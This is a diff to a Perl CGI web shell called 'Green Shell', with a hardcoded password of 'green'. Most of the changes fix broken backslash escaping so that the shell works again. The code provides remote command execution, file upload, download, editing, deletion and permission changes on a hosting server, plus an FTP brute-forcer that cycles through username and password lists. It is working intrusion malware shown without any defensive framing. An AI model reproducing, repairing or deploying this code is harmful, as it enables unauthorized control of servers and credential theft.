@@ -42,7 +42,7 @@ $ShowDynamicOutput = 1;			# If this is 1, then data is sent to the
 
 $CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
 $CmdPwd = ($WinNT ? "cd" : "pwd");
-$PathSep = ($WinNT ? "\" : "/");
+$PathSep = ($WinNT ? "\\" : "/");
 $Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
 $cols= 150;
 $rows= 26;
@@ -59,7 +59,7 @@ sub ReadParse
 	local (*in) = @_ if @_;
 	local ($i, $loc, $key, $val);
 	
-	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart/form-data; boundary=(.+)$/;
+	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
 
 	if($ENV{'REQUEST_METHOD'} eq "GET")
 	{
@@ -72,29 +72,29 @@ sub ReadParse
 	}
 
 	# handle file upload data
-	if($ENV{'CONTENT_TYPE'} =~ /multipart/form-data; boundary=(.+)$/)
+	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
 	{
 		$Boundary = '--'.$1; # please refer to RFC1867 
 		@list = split(/$Boundary/, $in); 
 		$HeaderBody = $list[1];
-		$HeaderBody =~ /rnrn|nn/;
+		$HeaderBody =~ /\r\n\r\n|\n\n/;
 		$Header = $`;
 		$Body = $';
- 		$Body =~ s/rn$//; # the last rn was put in by Netscape
+ 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
 		$in{'filedata'} = $Body;
-		$Header =~ /filename="(.+)"/; 
+		$Header =~ /filename=\"(.+)\"/; 
 		$in{'f'} = $1; 
-		$in{'f'} =~ s/"//g;
-		$in{'f'} =~ s/s//g;
+		$in{'f'} =~ s/\"//g;
+		$in{'f'} =~ s/\s//g;
 
 		# parse trailer
 		for($i=2; $list[$i]; $i++)
 		{ 
 			$list[$i] =~ s/^.+name=$//;
-			$list[$i] =~ /"(w+)"/;
+			$list[$i] =~ /\"(\w+)\"/;
 			$key = $1;
 			$val = $';
-			$val =~ s/(^(rnrn|nn))|(rn$|n$)//g;
+			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
 			$val =~ s/%(..)/pack("c", hex($1))/ge;
 			$in{$key} = $val; 
 		}
@@ -104,11 +104,11 @@ sub ReadParse
 		@in = split(/&/, $in);
 		foreach $i (0 .. $#in)
 		{
-			$in[$i] =~ s/+/ /g;
+			$in[$i] =~ s/\+/ /g;
 			($key, $val) = split(/=/, $in[$i], 2);
 			$key =~ s/%(..)/pack("c", hex($1))/ge;
 			$val =~ s/%(..)/pack("c", hex($1))/ge;
-			$in{$key} .= "" if (defined($in{$key}));
+			$in{$key} .= "\0" if (defined($in{$key}));
 			$in{$key} .= $val;
 		}
 	}
@@ -123,8 +123,8 @@ sub PrintPageHeader
 	$EncodedCurrentDir = $CurrentDir;
 	$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
 	my $dir =$CurrentDir;
-	$dir=~ s/\/\\/g;
-	print "Content-type: text/htmlnn";
+	$dir=~ s/\\/\\\\/g;
+	print "Content-type: text/html\n\n";
 	print <<END;
 <html>
 <head>
@@ -243,13 +243,13 @@ function chmod_form(i,file)
 }
 function rm_chmod_form(response,i,perms,file)
 {
-	response.innerHTML = "<span onclick=\"chmod_form(" + i + ",'"+ file+ "')\" >"+ perms +"</span></td>";
+	response.innerHTML = "<span onclick=\\\"chmod_form(" + i + ",'"+ file+ "')\\\" >"+ perms +"</span></td>";
 }
 function rename_form(i,file,f)
 {
 	var ajax="";
-	f.replace(/\\/g,"\\\\");
-	var back="rm_rename_form("+i+",\""+file+"\",\""+f+"\"); return false;";
+	f.replace(/\\\\/g,"\\\\\\\\");
+	var back="rm_rename_form("+i+",\\\""+file+"\\\",\\\""+f+"\\\"); return false;";
 	document.getElementById("File_"+i).innerHTML="<form name=FormPerms_" + i+ " action=' method='POST'><input id=text_" + i + "  name=rename type=text value= '"+file+"' /><input type=submit class='submit' onclick='" + ajax + "' value=OK><input type=submit class='submit' onclick='" + back + "' value=Cancel><input type=hidden name=a value='gui'><input type=hidden name=d value='$dir'><input type=hidden name=f value='"+file+"'></form>";
 	document.getElementById("text_" + i).focus();
 }
@@ -400,20 +400,20 @@ TypingText.prototype.run = function() {
 </script>
 </pre>
 
-<font style="font: 20pt Verdana; color: #d055ef;">Green Shell</font><br><br><font style="font: 10pt Verdana; color: #d055ef;">Password : green</font><br>
+<font style="font: 20pt Verdana; color: #d055ef;">Green SHell</font><br><br><font style="font: 10pt Verdana; color: #d055ef;">Password : green</font><br>
 <table align="center" border="1"  border-style="dashed" width="600" heigh>
 <tbody><tr>
 <td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran.gif"><p id="hack" style="margin-left: 3px;">
 <font color="#009900"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>
 
 <font color="#009900"> Trying connect to Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
-<font color="#F00000"><font color="#FFF000">~$</font> Connected ! </font><br>
+<font color="#F00000"><font color="#FFF000">~\$</font> Connected ! </font><br>
 <font color="#009900"><font color="#FFF000">$ServerName~</font> Checking Server . . . . . . . . . . . . . . . . . . .</font> <br>
 
 <font color="#009900"><font color="#FFF000">$ServerName~</font> Trying connect to Command . . . . . . . . . . .</font><br>
 
-<font color="#F00000"><font color="#FFF000">$ServerName~</font>$ Connected Command! </font><br>
-<font color="#009900"><font color="#FFF000">$ServerName~<font color="#F00000">$</font></font> OK! You can kill it!</font>
+<font color="#F00000"><font color="#FFF000">$ServerName~</font>\$ Connected Command! </font><br>
+<font color="#009900"><font color="#FFF000">$ServerName~<font color="#F00000">\$</font></font> OK! You can kill it!</font>
 </tr>
 </tbody></table>
 <br>
@@ -447,7 +447,7 @@ sub AddLinkDir($)
 	my @dir=();
 	if($WinNT)
 	{
-		@dir=split(/\/,$CurrentDir);
+		@dir=split(/\\/,$CurrentDir);
 	}else
 	{
 		@dir=split("/",&trim($CurrentDir));
@@ -524,7 +524,7 @@ sub PrintLogoutScreen
 #------------------------------------------------------------------------------
 sub PerformLogout
 {
-	print "Set-Cookie: SAVEDPWD=;n"; # remove password cookie
+	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
 	&PrintPageHeader("p");
 	&PrintLogoutScreen;
 
@@ -544,7 +544,7 @@ sub PerformLogin
 {
 	if($LoginPassword eq $Password) # password matched
 	{
-		print "Set-Cookie: SAVEDPWD=$LoginPassword;n";
+		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
 		&PrintPageHeader;
 		print &ListDir;
 	}
@@ -569,7 +569,7 @@ sub PerformLogin
 sub PrintCommandLineInputForm
 {
 	my $dir= "<span style='font: 11pt Verdana; font-weight: bold;'>".&AddLinkDir("command")."</span>";
-	$Prompt = $WinNT ? "$dir > " : "<font color='green'>[admin@$ServerName $dir]$</font> ";
+	$Prompt = $WinNT ? "$dir > " : "<font color='green'>[admin\@$ServerName $dir]\$</font> ";
 	return <<END;
 <form name="f" method="POST" action="$ScriptLocation">
 
@@ -589,7 +589,7 @@ END
 sub PrintFileDownloadForm
 {
 	my $dir = &AddLinkDir("download"); 
-	$Prompt = $WinNT ? "$dir > " : "[admin@$ServerName $dir]$ ";
+	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
 	return <<END;
 <form name="f" method="POST" action="$ScriptLocation">
 <input type="hidden" name="d" value="$CurrentDir">
@@ -608,7 +608,7 @@ END
 sub PrintFileUploadForm
 {
 	my $dir= &AddLinkDir("upload");
-	$Prompt = $WinNT ? "$dir > " : "[admin@$ServerName $dir]$ ";
+	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
 	return <<END;
 <form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
 $Prompt upload<br><br>
@@ -660,7 +660,7 @@ sub PrintDownloadLinkPage
 		# encode the file link so we can send it to the browser
 		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
 		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
-		$HtmlMetaHeader = "<meta HTTP-EQUIV="Refresh" CONTENT="1; URL=$DownloadLink">";
+		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
 		&PrintPageHeader("c");
 		$result .= <<END;
 Sending File $TransferFile...<br>
@@ -695,10 +695,10 @@ sub SendFileToBrowser
 			binmode(STDOUT);
 		}
 		$FileSize = (stat($SendFile))[7];
-		($Filename = $SendFile) =~  m!([^/^\]*)$!;
-		print "Content-Type: application/x-unknownn";
-		print "Content-Length: $FileSizen";
-		print "Content-Disposition: attachment; filename=$1nn";
+		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
+		print "Content-Type: application/x-unknown\n";
+		print "Content-Length: $FileSize\n";
+		print "Content-Disposition: attachment; filename=$1\n\n";
 		print while(<SENDFILE>);
 		close(SENDFILE);
 		exit(1);
@@ -721,14 +721,14 @@ sub SendFileToBrowser
 sub BeginDownload
 {
 	# get fully qualified path of the file to be downloaded
-	if(($WinNT & ($TransferFile =~ m/^\|^.:/)) |
-		(!$WinNT & ($TransferFile =~ m/^//))) # path is absolute
+	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
+		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
 	{
 		$TargetFile = $TransferFile;
 	}
 	else # path is relative
 	{
-		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\/]$/;
+		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
 		$TargetFile .= $PathSep.$TransferFile;
 	}
 
@@ -760,8 +760,8 @@ sub UploadFile
 	$result .= "Uploading $TransferFile to $CurrentDir...<br>";
 
 	# get the fullly qualified pathname of the file to be created
-	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\/]$/;
-	$TransferFile =~ m!([^/^\]*)$!;
+	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
+	$TransferFile =~ m!([^/^\\]*)$!;
 	$TargetName .= $PathSep.$1;
 
 	$TargetFileSize = length($in{'filedata'});
@@ -805,13 +805,13 @@ sub DownloadFile
 	}
 	
 	# get fully qualified path of the file to be downloaded
-	if(($WinNT & ($TransferFile =~ m/^\|^.:/)) | (!$WinNT & ($TransferFile =~ m/^//))) # path is absolute
+	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) | (!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
 	{
 		$TargetFile = $TransferFile;
 	}
 	else # path is relative
 	{
-		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\/]$/;
+		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
 		$TargetFile .= $PathSep.$TransferFile;
 	}
 
@@ -837,11 +837,11 @@ sub DownloadFile
 sub ExecuteCommand
 {
 	my $result="";
-	if($RunCommand =~ m/^s*cds+(.+)/) # it is a change dir command
+	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
 	{
 		# we change the directory internally. The output of the
 		# command is not displayed.
-		$Command = "cd "$CurrentDir"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
+		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
 		chop($CurrentDir = `$Command`);
 		$result .= &PrintCommandLineInputForm;
 
@@ -849,7 +849,7 @@ sub ExecuteCommand
 		# xuat thong tin khi chuyen den 1 thu muc nao do!
 		$RunCommand= $WinNT?"dir":"dir -lia";
 		$result .= &RunCmd;
-	}elsif($RunCommand =~ m/^s*edits+(.+)/)
+	}elsif($RunCommand =~ m/^\s*edit\s+(.+)/)
 	{
 		$result .=  &SaveFileForm;
 	}else
@@ -869,10 +869,10 @@ sub ExecuteCommand
 sub RunCmd
 {
 	my $result="";
-	$Command = "cd "$CurrentDir"".$CmdSep.$RunCommand.$Redirector;
+	$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
 	if(!$WinNT)
 	{
-		$SIG{'ALRM'} = &CommandTimeout;
+		$SIG{'ALRM'} = \&CommandTimeout;
 		alarm($CommandTimeoutDuration);
 	}
 	if($ShowDynamicOutput) # show output as it is generated
@@ -882,8 +882,8 @@ sub RunCmd
 		open(CommandOutput, $Command);
 		while(<CommandOutput>)
 		{
-			$_ =~ s/(n|rn)$//;
-			$result .= &HtmlSpecialChars("$_n");
+			$_ =~ s/(\n|\r\n)$//;
+			$result .= &HtmlSpecialChars("$_\n");
 		}
 		$|=0;
 	}
@@ -916,9 +916,9 @@ sub SaveFileForm
 		$msg="<br><font style='font: 15pt Verdana; color: yellow;' > Permission denied!<font><br>";
 		$rows="20"
 	}
-	$Prompt = $WinNT ? "$dir > " : "<font color='#FFFFFF'>[admin@$ServerName $dir]$</font> ";
+	$Prompt = $WinNT ? "$dir > " : "<font color='#FFFFFF'>[admin\@$ServerName $dir]\$</font> ";
 	$read=($WinNT)?"type":"less";
-	$RunCommand = "$read "$RunCommand"";
+	$RunCommand = "$read \"$RunCommand\"";
 	$result .=  <<END;
 	<form name="f" method="POST" action="$ScriptLocation">
 
@@ -1071,21 +1071,21 @@ sub BruteForcer
 	}else
 	{
 		use Net::FTP; 
-		@user= split(/n/, $in{'user'});
-		@pass= split(/n/, $in{'pass'});
+		@user= split(/\n/, $in{'user'});
+		@pass= split(/\n/, $in{'pass'});
 		chomp(@user);
 		chomp(@pass);
-		$result .= "<br><br>[+] Trying brute $ServerName<br>====================>>>>>>>>>>>><<<<<<<<<<====================<br><br>n";
+		$result .= "<br><br>[+] Trying brute $ServerName<br>====================>>>>>>>>>>>><<<<<<<<<<====================<br><br>\n";
 		foreach $username (@user)
 		{
 			if(!($username eq ""))
 			{
 				foreach $password (@pass)
 				{
-					$ftp = Net::FTP->new($Server) or die "Could not connect to $ServerNamen"; 
+					$ftp = Net::FTP->new($Server) or die "Could not connect to $ServerName\n"; 
 					if($ftp->login("$username","$password"))
 					{
-						$result .= "<a target='_blank' href='ftp://$username:$password@$Server'>[+] ftp://$username:$password@$Server</a><br>n";
+						$result .= "<a target='_blank' href='ftp://$username:$password\@$Server'>[+] ftp://$username:$password\@$Server</a><br>\n";
 						$ftp->quit();
 						break;
 					}
@@ -1097,7 +1097,7 @@ sub BruteForcer
 				}
 			}
 		}
-		$result .= "n<br>==========>>>>>>>>>> Finished <<<<<<<<<<==========<br>n";
+		$result .= "\n<br>==========>>>>>>>>>> Finished <<<<<<<<<<==========<br>\n";
 	}
 	return $result;
 }
@@ -1248,7 +1248,7 @@ sub FileOwner($)
 sub ParentFolder($)
 {
 	my $path = shift;
-	my $Comm = "cd "$CurrentDir"".$CmdSep."cd ..".$CmdSep.$CmdPwd;
+	my $Comm = "cd \"$CurrentDir\"".$CmdSep."cd ..".$CmdSep.$CmdPwd;
 	chop($path = `$Comm`);
 	return $path;
 }
@@ -1321,20 +1321,20 @@ sub ParseFileSize($)
 sub trim($)
 {
 	my $string = shift;
-	$string =~ s/^s+//;
-	$string =~ s/s+$//;
+	$string =~ s/^\s+//;
+	$string =~ s/\s+$//;
 	return $string;
 }
 sub AddSlashes($)
 {
 	my $string = shift;
-	$string=~ s/\/\\/g;
+	$string=~ s/\\/\\\\/g;
 	return $string;
 }
 sub ListDir
 {
 	my $path = $CurrentDir.$PathSep;
-	$path=~ s/\\/\/g;
+	$path=~ s/\\\\/\\/g;
 	my $result = "<form name='f' action='$ScriptLocation'><span style='font: 11pt Verdana; font-weight: bold;'>Path: [ ".&AddLinkDir("gui")." ] </span><input type='text' name='d' size='40' value='$CurrentDir' /><input type='hidden' name='a' value='gui'><input class='submit' type='submit' value='Change'></form>";
 	if(-d $path)
 	{
@@ -1390,9 +1390,9 @@ sub ListDir
 			<td id='File_$i' style='font: 11pt Verdana; font-weight: bold;'><a  href='?a=gui&d=".$d."'>[ ".$dirname." ]</a></td>";
 			$result .= "<td>DIR</td>";
 			$result .= "<td style='text-align:center;'>".&FileOwner($d)."</td>";
-			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick="rm_chmod_form(this,".$i.",'".&FilePerms($d)."','".$dirname."')" ><span onclick="chmod_form(".$i.",'".$dirname."')" >".&FilePerms($d)."</span></td>";
+			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($d)."','".$dirname."')\" ><span onclick=\"chmod_form(".$i.",'".$dirname."')\" >".&FilePerms($d)."</span></td>";
 			$result .= "<td style='text-align:center;'>".&FileLastModified($d)."</td>";
-			$result .= "<td style='text-align:center;'><a href='javascript:return false;' onclick="rename_form($i,'$dirname','".&AddSlashes(&AddSlashes($d))."')">Rename</a>  | <a onclick="if(!confirm('Remove dir: $dirname ?')) { return false;}" href='?a=gui&d=$path&remove=$dirname'>Remove</a></td>";
+			$result .= "<td style='text-align:center;'><a href='javascript:return false;' onclick=\"rename_form($i,'$dirname','".&AddSlashes(&AddSlashes($d))."')\">Rename</a>  | <a onclick=\"if(!confirm('Remove dir: $dirname ?')) { return false;}\" href='?a=gui&d=$path&remove=$dirname'>Remove</a></td>";
 			$result .= "</tr>";
 			$i++;
 		}
@@ -1405,9 +1405,9 @@ sub ListDir
 			$result .= "<tr class='$style'><td id='File_$i' style='font: 11pt Verdana;'><a href='?a=command&d=".$path."&c=edit%20".$file."'>".$file."</a></td>";
 			$result .= "<td>".&ParseFileSize(&FileSize($f))."</td>";
 			$result .= "<td style='text-align:center;'>".&FileOwner($f)."</td>";
-			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick="rm_chmod_form(this,".$i.",'".&FilePerms($f)."','".$file."')" ><span onclick="chmod_form($i,'$file')" >".&FilePerms($f)."</span></td>";
+			$result .= "<td id='FilePerms_$i' style='text-align:center;' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($f)."','".$file."')\" ><span onclick=\"chmod_form($i,'$file')\" >".&FilePerms($f)."</span></td>";
 			$result .= "<td style='text-align:center;'>".&FileLastModified($f)."</td>";
-			$result .= "<td style='text-align:center;'><a href='?a=command&d=".$path."&c=edit%20".$file."'>Edit</a> | <a href='javascript:return false;' onclick="rename_form($i,'$file','f')">Rename</a> | <a href='?a=download&o=go&f=".$f."'>Download</a> | <a onclick="if(!confirm('Remove file: $file ?')) { return false;}" href='?a=gui&d=$path&remove=$file'>Remove</a></td>";
+			$result .= "<td style='text-align:center;'><a href='?a=command&d=".$path."&c=edit%20".$file."'>Edit</a> | <a href='javascript:return false;' onclick=\"rename_form($i,'$file','f')\">Rename</a> | <a href='?a=download&o=go&f=".$f."'>Download</a> | <a onclick=\"if(!confirm('Remove file: $file ?')) { return false;}\" href='?a=gui&d=$path&remove=$file'>Remove</a></td>";
 			$result .= "</tr>";
 			$i++;
 		}
@@ -1427,7 +1427,7 @@ sub ViewDomainUser
 	my $result="<h5><font style='font: 15pt Verdana;color: #fff;'>Hoang Sa - Truong Sa</font></h5>";
 	if ($err)
 	{
-		$result .=  ('<p>C0uldn't Bypass it , Sorry</p>');
+		$result .=  ('<p>C0uldn\'t Bypass it , Sorry</p>');
 		return $result;
 	}else
 	{
